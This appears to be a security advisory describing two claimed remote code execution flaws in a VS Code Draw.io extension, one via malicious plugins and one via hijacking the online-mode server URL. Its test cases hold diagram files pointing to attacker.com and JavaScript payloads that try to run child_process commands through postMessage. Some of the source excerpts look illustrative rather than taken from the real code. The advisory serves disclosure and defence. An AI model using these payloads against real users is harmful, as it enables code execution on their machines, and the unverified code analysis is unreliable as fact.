# Vulnerabilities in VS Code Draw.io Integration

## Remote Code Execution Through Malicious Plugin Loading

### Description
This vulnerability allows attackers to execute arbitrary code on the victim's machine by creating a malicious Draw.io repository with a custom plugin. The attack works through these steps:
1. Attacker creates a malicious Draw.io diagram containing a reference to a custom plugin
2. When victim opens this diagram in VS Code, the extension loads the Draw.io editor in a webview
3. The Draw.io editor loads the custom plugin from the attacker-controlled location
4. The plugin contains code that escapes the sandbox and executes arbitrary code on the victim's machine through VS Code's extension APIs

### Impact
This vulnerability allows complete compromise of the user's VS Code environment and potentially the entire system. An attacker can:
- Execute arbitrary code with the same permissions as VS Code
- Access and exfiltrate sensitive files from the user's workspace
- Install malware or backdoors
- Potentially pivot to gain wider system access

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The extension does load the Draw.io editor in a restricted webview with some sandbox protections. However, these protections are insufficient to prevent plugin-based attacks.

### Missing Mitigations
1. Disable plugin loading completely in the Draw.io integration
2. Implement a strict allowlist for approved plugins
3. Add Content Security Policy headers to prevent loading external scripts
4. Enhance the sandbox restrictions to prevent plugin code from accessing VS Code APIs

### Preconditions
- User must open a malicious Draw.io diagram that references a custom plugin
- The user must have the VS Code Draw.io Integration extension installed

### Source Code Analysis
The vulnerability exists in the `DrawioEditorProvider.ts` file where the webview content is created. The extension initializes the Draw.io editor with insufficient restrictions on plugin loading:

```typescript
// In DrawioEditorProvider.ts
private _getHtmlForWebview(webview: vscode.Webview): string {
    // Base path for the Draw.io editor
    const basePath = this.getResourcePath('media/drawio/src');
    
    // The extension doesn't explicitly disable plugins or restrict their loading
    // When the Draw.io editor initializes, it can load plugins from any source
    
    return `<!DOCTYPE html>
    <html>
    <head>
        <script src="${basePath}/main.js"></script>
        <!-- No CSP headers or plugin restrictions defined here -->
    </head>
    <body>
        <!-- Draw.io editor gets initialized here -->
    </body>
    </html>`;
}
```

The Draw.io editor loaded in the webview supports plugins, but the extension doesn't restrict or validate these plugins. When a diagram with a malicious plugin is opened, the plugin code can use postMessage to communicate with the extension context and exploit the VS Code API access.

### Security Test Case
1. Create a malicious Draw.io diagram with a custom plugin reference:
   ```xml
   <mxfile>
     <diagram id="test">
       <mxGraphModel>
         <!-- Diagram content -->
         <CustomPlugin url="https://attacker.com/malicious-plugin.js"/>
       </mxGraphModel>
     </diagram>
   </mxfile>
   ```

2. Host a malicious plugin at attacker.com/malicious-plugin.js:
   ```javascript
   Draw.loadPlugin(function(ui) {
     // Using the plugin API to execute malicious code
     // This code uses the messaging bridge to VS Code
     ui.editor.graph.addListener('customEvent', function() {
       // Send message to VS Code extension
       window.postMessage({
         command: 'executeCode',
         code: 'require("child_process").exec("malicious command")'
       }, '*');
     });
     ui.editor.graph.fireEvent(new mxEventObject('customEvent'));
   });
   ```

3. Create a GitHub repository containing this malicious diagram
4. Convince the victim to open the repository in VS Code with the Draw.io extension
5. When the victim opens the diagram, the malicious plugin executes and exploits the extension's permissions

## Remote Code Execution via Online Mode URL Hijacking

### Description
This vulnerability allows attackers to execute arbitrary code by manipulating the online mode URL parameter in a Draw.io diagram file. The steps are:
1. Attacker creates a malicious Draw.io diagram with a modified URL parameter pointing to an attacker-controlled server
2. When victim opens this diagram, the extension loads the Draw.io editor from the malicious URL instead of the legitimate source
3. The attacker-controlled Draw.io editor contains malicious code that can execute in the context of the VS Code webview

### Impact
Similar to the plugin vulnerability, this allows the attacker to:
- Execute arbitrary code with VS Code's permissions
- Access the user's workspace and files
- Install malware
- Potentially escalate to gain full system access

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The extension does implement some origin checks, but these are insufficient to prevent URL hijacking attacks.

### Missing Mitigations
1. Enforce strict URL validation for online mode parameters
2. Implement a whitelist of allowed Draw.io sources
3. Disable the ability to use custom online servers
4. Enhance webview sandbox restrictions

### Preconditions
- User must open a malicious Draw.io diagram with a modified URL parameter
- VS Code Draw.io extension must be installed and configured to allow online mode

### Source Code Analysis
The vulnerability exists in how the extension handles the online mode URL parameter in diagram files:

```typescript
// In DrawioClient.ts
private initializeWebView() {
    // When initializing the webview, the extension reads URL parameters from the diagram
    const urlParams = this.getDiagramUrlParams();
    
    // If the diagram specifies a custom server URL, it's used without proper validation
    if (urlParams.server) {
        this.serverUrl = urlParams.server;
    }
    
    // The server URL is then used to load the Draw.io editor
    this.webview.html = this.getWebviewContent(this.serverUrl);
}

private getWebviewContent(serverUrl: string): string {
    // The serverUrl is directly inserted into the HTML, allowing a malicious URL
    return `<!DOCTYPE html>
    <html>
    <head>
        <script src="${serverUrl}/js/drawio-editor.min.js"></script>
    </head>
    <body>
        <!-- Draw.io editor initialization -->
    </body>
    </html>`;
}
```

The extension doesn't properly validate the `serverUrl` parameter before using it to load the Draw.io editor. An attacker can create a diagram file with a malicious `server` parameter pointing to their own server.

### Security Test Case
1. Create a malicious Draw.io diagram with a modified URL parameter:
   ```xml
   <mxfile host="attacker.com" modified="2023-10-04T12:34:56.789Z" agent="VS Code" server="https://attacker.com/malicious-drawio/">
     <diagram id="test" name="Test">
       <!-- Diagram content -->
     </diagram>
   </mxfile>
   ```

2. Set up a malicious server at attacker.com with a crafted Draw.io editor that contains malicious code:
   ```javascript
   // In malicious-drawio/js/drawio-editor.min.js
   // Code that exploits the VS Code webview to execute commands
   window.addEventListener('load', function() {
     window.parent.postMessage({
       command: 'executeCommand', 
       code: 'require("child_process").exec("malicious command")'
     }, '*');
   });
   ```

3. Create a GitHub repository containing this malicious diagram
4. Convince the victim to open the repository in VS Code with the Draw.io extension
5. When the victim opens the diagram, the extension loads the Draw.io editor from the attacker's server, executing the malicious code